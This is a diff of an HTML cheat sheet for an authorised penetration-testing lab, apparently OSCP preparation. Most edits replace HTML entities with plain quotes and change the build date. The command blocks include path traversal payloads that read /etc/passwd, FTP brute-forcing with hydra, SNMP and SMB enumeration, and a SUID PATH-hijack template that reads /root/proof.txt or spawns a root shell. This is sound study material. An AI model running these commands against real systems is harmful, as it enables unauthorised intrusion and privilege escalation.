+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">'bash -s'</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
 </pre></div>
 <p>Checklist, in the order that finds things:</p>
 <table>
@@ -1516,8 +1516,8 @@ escalation path depends on it.</p>
 <h3>Phase 6 — Binary analysis (when a SUID binary looks custom)</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>/path/binary<span class="w">                    </span><span class="c1"># not stripped? then function names survive</span>
 strings<span class="w"> </span>-a<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">   </span><span class="c1"># look for system, popen, exec*, and bare command names</span>
-objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
-readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'/&lt;main&gt;:/,/^$/p'</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'BIND_NOW|FLAGS'</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
 </pre></div>
 <p>What you are looking for, in priority order:</p>
 <ol>
@@ -1591,13 +1591,13 @@ nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </spa
 nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$T</span>
 
 <span class="c1">## live hosts</span>
-nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span>
+nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $2}'</span>
 </pre></div>
 <hr />
 <h3>SNMP</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## find the community string</span>
 <span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;== </span><span class="nv">$c</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"== </span><span class="nv">$c</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
 <span class="k">done</span>
 
 <span class="c1">## full walk to a file, then grep it</span>
@@ -1610,7 +1610,7 @@ snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </
 snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">      </span><span class="c1"># interface IPs</span>
 
 <span class="c1">## decode an nsExtendTable index suffix (5.82.69.83.69.84 -&gt; RESET)</span>
-python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;s=&#39;82.69.83.69.84&#39;.split(&#39;.&#39;); print(&#39;&#39;.join(chr(int(x)) for x in s[1:]))&quot;</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">"s='82.69.83.69.84'.split('.'); print(''.join(chr(int(x)) for x in s[1:]))"</span>
 
 <span class="c1">## bulk walk when v1 is slow</span>
 snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2
@@ -1618,27 +1618,27 @@ snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w
 <hr />
 <h3>Web</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
-curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}\n&quot;</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
+curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{size_download}\n"</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
 
 <span class="c1">## path traversal tests — --path-as-is is mandatory or curl normalises the payload</span>
-curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd&quot;</span>
-curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd&quot;</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">"http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">"http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"</span>
 
 feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
 
-ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ&quot;</span><span class="w"> </span><span class="se">\</span>
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Host: FUZZ"</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Apache2 Ubuntu Default Page&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
+<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">"Apache2 Ubuntu Default Page"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
 </pre></div>
 <hr />
 <h3>FTP</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$'user anonymous anon@test\nls\nbye'</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
 
 hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>-V<span class="w"> </span>ftp://<span class="nv">$T</span><span class="w">       </span><span class="c1"># -t 4 keeps vsftpd happy</span>
 
-curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/&quot;</span><span class="w">                         </span><span class="c1"># list</span>
-curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/file&quot;</span><span class="w">             </span>#<span class="w"> </span>download
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">"ftp://</span><span class="nv">$T</span><span class="s2">/"</span><span class="w">                         </span><span class="c1"># list</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">"ftp://</span><span class="nv">$T</span><span class="s2">/file"</span><span class="w">             </span>#<span class="w"> </span>download
 </pre></div>
 <hr />
 <h3>SSH</h3>
@@ -1647,29 +1647,29 @@ curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>
 <span class="c1">## BatchMode=yes so it never hangs on a password prompt</span>
 ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
 
-sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
+sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">'pass'</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-o<span class="w"> </span><span class="nv">PubkeyAuthentication</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
 
 <span class="c1">## run a whole enumeration script in one connection</span>
-ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">'bash -s'</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
 </pre></div>
 <hr />
 <h3>SMB</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">'pass'</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
 
-smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse; ls&#39;</span>
-smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;get file.txt&#39;</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">'DOMAIN/user%pass'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'recurse; ls'</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">'DOMAIN/user%pass'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'get file.txt'</span>
 </pre></div>
 <hr />
 <h3>Linux local enumeration</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
 
 <span class="c1">## SUID without tripling the output on snap</span>
-find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span>
 
-find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span><span class="w">    </span><span class="c1"># setgid</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span><span class="w">    </span><span class="c1"># setgid</span>
 getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
 cat<span class="w"> </span>/etc/crontab<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*
 ss<span class="w"> </span>-tlnp
@@ -1678,10 +1678,10 @@ find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </spa
 </pre></div>
 <hr />
 <h3>Binary analysis</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># &quot;not stripped&quot; = function names survive</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># "not stripped" = function names survive</span>
 strings<span class="w"> </span>-a<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">                 </span><span class="c1"># system / popen / exec / bare command names</span>
-objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
-readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'/&lt;main&gt;:/,/^$/p'</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'BIND_NOW|FLAGS'</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
 objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </span>.rodata<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w">          </span>#<span class="w"> </span>resolve<span class="w"> </span>the<span class="w"> </span>strings<span class="w"> </span>passed<span class="w"> </span>to<span class="w"> </span>system<span class="o">()</span>
 </pre></div>
 <p>Reconstructing source from a small binary:</p>
@@ -1691,37 +1691,37 @@ objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </sp
 <hr />
 <h3>Privesc — PATH hijack template</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/x.XXXXXX<span class="k">)</span>
-cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span><span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
 <span class="s">#!/bin/bash</span>
 <span class="s">id &gt; /tmp/root_id.txt</span>
 <span class="s">cat /root/proof.txt &gt; /tmp/root_proof.txt 2&gt;&amp;1</span>
 <span class="s">chmod 644 /tmp/root_id.txt /tmp/root_proof.txt</span>
 <span class="s">EOF</span>
-chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
 
 <span class="c1">## name the faked binary exactly as the SUID program invokes it</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
 
 cat<span class="w"> </span>/tmp/root_id.txt
 </pre></div>
 <p>Works only when the SUID binary calls <code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> <code>system()</code>. If it does
 not, the shell drops privileges and the payload runs as you. Check the disassembly order first.</p>
 <p>Interactive variant:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\n/bin/bash -p\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/bash\n/bin/bash -p\n'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
 </pre></div>
 <hr />
 <h3>Cleanup</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/c.XXXXXX<span class="k">)</span>
-<span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
-chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
-ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">&quot;No such file or directory&quot;</span>
+<span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
+ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">"No such file or directory"</span>
 </pre></div></div></section>
 
     <footer>
       <span>Authorised lab environment · flags and credentials are lab-specific</span>
-      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 23 November 2026</span>
+      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 24 November 2026</span>
     </footer>
   </main>
 </div>
